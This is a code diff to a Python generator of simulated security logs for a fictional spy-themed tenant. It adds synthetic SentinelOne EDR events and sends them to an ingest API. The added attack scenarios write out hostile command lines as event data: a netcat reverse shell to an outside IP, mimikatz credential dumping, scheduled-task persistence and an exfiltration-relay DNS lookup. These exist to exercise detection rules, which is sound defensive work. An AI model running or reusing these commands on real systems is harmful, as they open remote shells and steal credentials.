@@ -18,6 +18,8 @@ import random
 import socket
 import time
 import logging
+import urllib.request
+import urllib.error
 from datetime import datetime, timezone
 from typing import Callable
 
@@ -28,6 +30,13 @@ INTERVAL_MS    = int(os.getenv("LOG_INTERVAL_MS", "1500"))
 BURST_SIZE     = int(os.getenv("LOG_BURST", "5"))
 SCENARIO_CHANCE = float(os.getenv("SCENARIO_CHANCE", "0.02"))  # prob. a burst is a scripted storyline
 HOSTNAME_SELF  = "treadstone-sim-01"
+
+# SentinelOne EDR events bypass syslog-ng/DataPipeline entirely and post
+# straight into SDL -- real EDR telemetry never flows through a customer's
+# DataPipeline HEC pipeline either; the agent reports directly to the S1
+# backend. Reuses the same SDL_WRITE_TOKEN already configured for FoundStone.
+SDL_BASE_URL    = os.getenv("SDL_BASE_URL", "").rstrip("/")
+SDL_WRITE_TOKEN = os.getenv("SDL_WRITE_TOKEN", "")
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 log = logging.getLogger(__name__)
@@ -385,6 +394,42 @@ AWS_S3_BUCKETS = {
 # Corporate egress ranges -- benign CloudTrail calls always originate here.
 # Only compromise scenarios show a foreign/public source IP.
 AWS_TRUSTED_SOURCE_IPS = ["10.0.1.10", "10.0.2.20", "10.1.0.50", "10.2.5.100"]
+
+# ── SentinelOne native EDR telemetry ────────────────────────────────────────
+#
+# Schema grounded in this tenant's OWN deployed detection library
+# (data/extracted.json) rather than guessed: field names (event.type,
+# src.process.*/tgt.process.*, endpoint.os, cmdScript.content,
+# registry.keyPath, event.dns.request, task.path, module.path) and the
+# event.type distribution (Process Creation is overwhelmingly dominant) were
+# pulled directly from the 746 real SentinelOne-sourced rules in this tenant.
+#
+# Same secure-by-default philosophy as AWS: ambient traffic is signed,
+# known-publisher, ordinary parent/child process trees. LOLBins, credential
+# dumping, reverse shells, unsigned binaries, and persistence mechanisms are
+# deliberately NEVER ambient -- they only appear in the dedicated EDR attack
+# scenarios below.
+EDR_ENDPOINTS = {
+    # hostname -> os  (reuses existing WIN_HOSTS/INTERNAL_HOSTS as the same
+    # machines' EDR agent, plus a couple of analyst laptops for osx coverage)
+    "LANGLEY-DC01": "windows", "BLACKBRIAR-DB01": "windows",
+    "IRONHAND-CTRL01": "windows", "OUTCOME-WS04": "windows",
+    "TREADSTONE-NYC-LAB01": "windows", "OPS-DMZ-GW01": "windows",
+    "embassy-berlin-fw01.cia.gov": "linux", "outpost-tulsa-ok.cia.gov": "linux",
+    "station-vienna-01.cia.gov": "linux", "blackbriar-db01.cia.gov": "linux",
+    "sarah-okonkwo-mbp.cia.gov": "osx", "tom-stack-mbp.cia.gov": "osx",
+}
+EDR_AGENT_VERSION = "23.4.2.10"
+EDR_SIGNED_PUBLISHERS = ["Microsoft Corporation", "Microsoft Windows", "Google LLC", "Apple Inc."]
+EDR_BENIGN_PROCS = [
+    # (parent_name, parent_cmdline, child_name, child_cmdline, publisher)
+    ("explorer.exe", "C:\\Windows\\explorer.exe", "chrome.exe", "chrome.exe --profile-directory=Default", "Google LLC"),
+    ("services.exe", "C:\\Windows\\System32\\services.exe", "svchost.exe", "svchost.exe -k netsvcs -p", "Microsoft Corporation"),
+    ("bash", "-bash", "curl", "curl -s https://update.googleapis.com/service/update2", "Google LLC"),
+    ("bash", "-bash", "git", "git fetch origin main", "Microsoft Corporation"),
+    ("launchd", "/sbin/launchd", "softwareupdated", "/usr/libexec/softwareupdated", "Apple Inc."),
+    ("powershell.exe", "powershell.exe -NoProfile", "Get-Process", "Get-Process | Where-Object {$_.CPU -gt 10}", "Microsoft Corporation"),
+]
 
 # CIA-plausible destination ports
 SENSITIVE_PORTS = {
@@ -1085,6 +1130,148 @@ def gen_cloudtrail_event() -> str:
                                    error_message=f"User: arn:aws:sts::{account}:assumed-role/{AWS_ROLES[program]}/{op['name']} is not authorized to perform this action")
     return _cloudtrail_line(event, sev=4 if choice == "access_denied" else 6)
 
+def _proc(name: str, cmdline: str, *, display_name: str | None = None, publisher: str | None = None,
+          user: str | None = None, image_path: str | None = None,
+          parent: dict | None = None) -> dict:
+    """Build a src.process/tgt.process-shaped dict (real field names -- see EDR schema note)."""
+    p: dict = {"name": name, "cmdline": cmdline}
+    if display_name: p["displayName"] = display_name
+    if publisher: p["publisher"] = publisher
+    if user: p["user"] = user
+    if image_path: p["image"] = {"path": image_path, "originalFileName": name}
+    if parent: p["parent"] = parent
+    return p
+
+def _edr_event(event_type: str, endpoint: str, *, category: str = "Process", site: str = "TREADSTONE",
+                src_process: dict | None = None, tgt_process: dict | None = None,
+                tgt_file: dict | None = None, src_ip: str | None = None, src_port: int | None = None,
+                dst_ip: str | None = None, dst_port: int | None = None, net_direction: str | None = None,
+                registry: dict | None = None, task_path: str | None = None, module_path: str | None = None,
+                cmd_script: str | None = None, dns_request: str | None = None,
+                indicator: dict | None = None) -> dict:
+    """Build a realistic SentinelOne EDR event. Field names grounded in this
+    tenant's own deployed rules (data/extracted.json) -- see the EDR schema
+    note above EDR_ENDPOINTS."""
+    os_name = EDR_ENDPOINTS.get(endpoint, "windows")
+    now = datetime.now(timezone.utc)
+    event: dict = {
+        "dataSource": {"name": "SentinelOne", "vendor": "SentinelOne", "category": "endpoint"},
+        "event": {"type": event_type, "category": category,
+                  "time": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"},
+        "endpoint": {"os": os_name, "name": endpoint,
+                     "type": "server" if endpoint.upper() in ("LANGLEY-DC01", "BLACKBRIAR-DB01") else "workstation"},
+        # NOTE: named "s1Agent", not "agent" -- "agent" is a reserved envelope
+        # key (syslog-ng's forwarder tag) and would otherwise collide.
+        "s1Agent": {"uuid": "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)),
+                    "version": EDR_AGENT_VERSION},
+        "site": {"name": site},
+        "account": {"name": "CIA-Langley"},
+    }
+    src: dict = {}
+    if src_process: src["process"] = src_process
+    if src_ip: src["ip"] = {"address": src_ip}
+    if src_port: src["port"] = {"number": src_port}
+    if src: event["src"] = src
+
+    tgt: dict = {}
+    if tgt_process: tgt["process"] = tgt_process
+    if tgt_file: tgt["file"] = tgt_file
+    if tgt: event["tgt"] = tgt
+
+    dst: dict = {}
+    if dst_ip: dst["ip"] = {"address": dst_ip}
+    if dst_port: dst["port"] = {"number": dst_port}
+    if dst: event["dst"] = dst
+    if net_direction: event["event"]["network"] = {"direction": net_direction}
+    if registry: event["registry"] = registry
+    if task_path: event["task"] = {"path": task_path}
+    if module_path: event["module"] = {"path": module_path}
+    if cmd_script: event["cmdScript"] = {"content": cmd_script}
+    if dns_request: event["event"]["dns"] = {"request": dns_request}
+    if indicator: event["indicator"] = indicator
+    return event
+
+def _flatten(d: dict, prefix: str = "") -> dict:
+    """Flatten a nested dict to SDL's dotted-key attrs shape (matches how
+    FoundStone's own ingester.py / real detection rule pair_lists address
+    fields, e.g. "tgt.process.cmdline")."""
+    out: dict = {}
+    for k, v in d.items():
+        key = f"{prefix}.{k}" if prefix else k
+        if isinstance(v, dict):
+            out.update(_flatten(v, key))
+        else:
+            out[key] = v
+    return out
+
+def _edr_line(event: dict, sev: int = 6) -> None:
+    """Ingest an EDR event directly into SDL via addEvents -- bypassing
+    syslog-ng/DataPipeline entirely (see the SDL_BASE_URL/SDL_WRITE_TOKEN
+    comment near the top of this file). Returns None: there is nothing left
+    for the caller to send over the syslog-ng TCP socket."""
+    if not SDL_BASE_URL or not SDL_WRITE_TOKEN:
+        log.warning("SDL_BASE_URL/SDL_WRITE_TOKEN not set -- skipping direct EDR ingest for %s",
+                    event.get("event", {}).get("type"))
+        return None
+
+    attrs = _flatten(event)
+    attrs["tags"] = "treadstone-simulation"
+    now_ms = int(time.time() * 1000)
+    now_ns = now_ms * 1_000_000  # addEvents requires nanoseconds since epoch -- a
+                                  # millisecond `ts` is silently dropped (bytesCharged=0)
+    payload = json.dumps({
+        "token": SDL_WRITE_TOKEN,
+        "session": f"treadstone-edr-{now_ms}-{random.randint(0, 999999)}",
+        "events": [{"ts": str(now_ns), "attrs": attrs}],
+    }).encode("utf-8")
+    req = urllib.request.Request(
+        f"{SDL_BASE_URL}/api/addEvents", data=payload,
+        headers={"Content-Type": "application/json"}, method="POST",
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=15) as resp:
+            resp.read()
+    except urllib.error.URLError as exc:
+        log.error("Direct SDL ingest failed for EDR event (%s): %s",
+                  event.get("event", {}).get("type"), exc)
+    return None
+
+def gen_s1_edr_event() -> None:
+    """Ambient SentinelOne EDR traffic -- signed publishers, ordinary parent/child
+    process trees. LOLBins, credential dumping, and persistence never appear
+    here; only in the dedicated EDR attack scenarios."""
+    endpoint = random.choice(list(EDR_ENDPOINTS))
+    op = random.choice(OPERATIVES)
+    parent_name, parent_cmd, child_name, child_cmd, publisher = random.choice(EDR_BENIGN_PROCS)
+
+    choice = random.choices(
+        ["process", "dns", "ip_connect", "file"], weights=[6, 3, 3, 2],
+    )[0]
+
+    if choice == "process":
+        parent = _proc(parent_name, parent_cmd, publisher=publisher)
+        tgt = _proc(child_name, child_cmd, publisher=publisher, user=op["name"], parent=parent)
+        event = _edr_event("Process Creation", endpoint, tgt_process=tgt)
+    elif choice == "dns":
+        src = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
+        event = _edr_event("DNS Resolved", endpoint, category="Network", src_process=src,
+                            dns_request=random.choice(["login.microsoftonline.com", "www.bbc.co.uk",
+                                                        "update.googleapis.com", "outlook.office365.com"]))
+    elif choice == "ip_connect":
+        src = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
+        event = _edr_event("IP Connect", endpoint, category="Network", src_process=src,
+                            src_ip=random.choice(INTERNAL_IPS), src_port=random.randint(49152, 65535),
+                            dst_ip=random.choice(["20.190.160.14", "142.250.80.110", "151.101.0.81"]),
+                            dst_port=443, net_direction="OUTGOING")
+    else:  # file
+        proc = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
+        event = _edr_event("File Creation", endpoint, category="File", src_process=proc,
+                            tgt_file={"path": f"C:\\Users\\{op['name']}\\Documents\\report.docx"
+                                      if EDR_ENDPOINTS[endpoint] == "windows"
+                                      else f"/home/{op['name']}/report.pdf",
+                                      "name": "report", "extension": "docx" if EDR_ENDPOINTS[endpoint] == "windows" else "pdf"})
+    return _edr_line(event)
+
 def _fake_sha256() -> str:
     chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
     return "".join(random.choices(chars, k=43))
@@ -1606,6 +1793,59 @@ def sc_aws_defense_evasion_petra():
         _sudo_line("blackbriar-db01.cia.gov", "petra", "/usr/bin/openssl s_client -connect langley.cia.gov:443"),
     ])
 
+def sc_edr_reverse_shell_petra():
+    """EDR — Petra drops a netcat reverse shell on McKenna's Tulsa host (companion to sc_petra_handler_betrayal)."""
+    endpoint = "outpost-tulsa-ok.cia.gov"
+    ip = "160.153.0.12"  # Beirut -- her known egress
+    shell = _proc("bash", "-bash", user="doug.mckenna")
+    nc_proc = _proc("nc", f"nc -e /bin/bash {ip} 4444", user="doug.mckenna", parent=shell)
+    proc_event = _edr_event("Process Creation", endpoint, tgt_process=nc_proc)
+    net_event = _edr_event("IP Connect", endpoint, category="Network", src_process=nc_proc,
+                            src_ip="10.12.5.100", src_port=51221, dst_ip=ip, dst_port=4444,
+                            net_direction="OUTGOING")
+    return ("EDR — Petra drops a netcat reverse shell on McKenna's host", [
+        _edr_line(proc_event, sev=2),
+        _edr_line(net_event, sev=2),
+        _asa_line("noc-ids01.cia.gov", "ASA400", "%ASA-2-4009100: IDS:9100 Blackbriar Kill-Order C2 Channel from "+ip+" to 10.12.5.100 on interface outside [ASSET:ASSET-MCKENNA]", sev=2),
+    ])
+
+def sc_edr_mimikatz_langley():
+    """EDR — mimikatz credential dumping on IRONHAND-CTRL01 (companion to sc_lateral_langley)."""
+    endpoint = "IRONHAND-CTRL01"
+    cmd = _proc("cmd.exe", "cmd.exe /c mimikatz.exe", user="ezra.kramer")
+    mimikatz = _proc("mimikatz.exe", "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
+                      display_name="mimikatz.exe", user="ezra.kramer", parent=cmd)
+    proc_event = _edr_event("Process Creation", endpoint, tgt_process=mimikatz)
+    indicator_event = _edr_event("Behavioral Indicators", endpoint, category="Indicator", src_process=mimikatz,
+                                  indicator={"name": "Credential Access via Mimikatz", "category": "Credential Access",
+                                             "description": "Process accessed LSASS memory to harvest credentials",
+                                             "tactics": "Credential Access", "techniques": "T1003.001"})
+    return ("EDR — mimikatz credential dumping on IRONHAND-CTRL01", [
+        _edr_line(proc_event, sev=2),
+        _edr_line(indicator_event, sev=1),
+    ])
+
+def sc_edr_task_persistence_mckenna():
+    """EDR — scheduled-task persistence registered during McKenna's Treadstone activation."""
+    endpoint = "TREADSTONE-NYC-LAB01"
+    proc = _proc("schtasks.exe", "schtasks.exe /create /tn TreadstoneSync /tr behavior_mod.py /sc onlogon",
+                 user="doug.mckenna")
+    event = _edr_event("Task Register", endpoint, category="Task", src_process=proc,
+                        task_path="\\Microsoft\\Windows\\TreadstoneSync")
+    return ("EDR — scheduled-task persistence during McKenna's activation", [
+        _edr_line(event, sev=3),
+    ])
+
+def sc_edr_dns_exfil_neski():
+    """EDR — DNS resolution to the exfil relay during Neski files exfiltration (companion to sc_dns_tunnel_exfil)."""
+    endpoint = "blackbriar-db01.cia.gov"
+    proc = _proc("bash", "-bash", user="ward.abbott")
+    event = _edr_event("DNS Resolved", endpoint, category="Network", src_process=proc,
+                        dns_request="exfil-relay.example.com")
+    return ("EDR — DNS resolution to exfil-relay during Neski files exfiltration", [
+        _edr_line(event, sev=3),
+    ])
+
 SCENARIOS: list[Callable[[], tuple]] = [
     sc_zurich_bank, sc_paris_safehouse, sc_berlin_neski, sc_goa_kirill,
     sc_waterloo_ross, sc_madrid_daniels, sc_tangier_desh, sc_manila_outcome,
@@ -1618,6 +1858,8 @@ SCENARIOS: list[Callable[[], tuple]] = [
     sc_east_berlin_origin, sc_mckenna_awakening, sc_seoul_pak_awakening,
     sc_petra_handler_betrayal,
     sc_aws_privesc_kublinski, sc_aws_defense_evasion_petra,
+    sc_edr_reverse_shell_petra, sc_edr_mimikatz_langley,
+    sc_edr_task_persistence_mckenna, sc_edr_dns_exfil_neski,
 ]
 
 # ─── Generator registry ────────────────────────────────────────────────────────
@@ -1642,6 +1884,7 @@ GENERATORS: list[tuple[int, Callable[[], str]]] = [
     (6,  gen_db_audit),
     (10, gen_win_event),
     (12, gen_cloudtrail_event),
+    (15, gen_s1_edr_event),
 ]
 
 POPULATION = [fn for weight, fn in GENERATORS for _ in range(weight)]
@@ -1655,11 +1898,14 @@ def send_logs(sock: socket.socket) -> int:
         title, lines = random.choice(SCENARIOS)()
         log.info(f"[SCENARIO] {title} — {len(lines)} correlated events")
         for line in lines:
-            sock.sendall(line.encode("utf-8"))
+            if line is not None:  # EDR lines are ingested directly into SDL, nothing to send here
+                sock.sendall(line.encode("utf-8"))
         return len(lines)
 
     for _ in range(BURST_SIZE):
-        sock.sendall(random.choice(POPULATION)().encode("utf-8"))
+        line = random.choice(POPULATION)()
+        if line is not None:
+            sock.sendall(line.encode("utf-8"))
     return BURST_SIZE
 
 def connect() -> socket.socket:
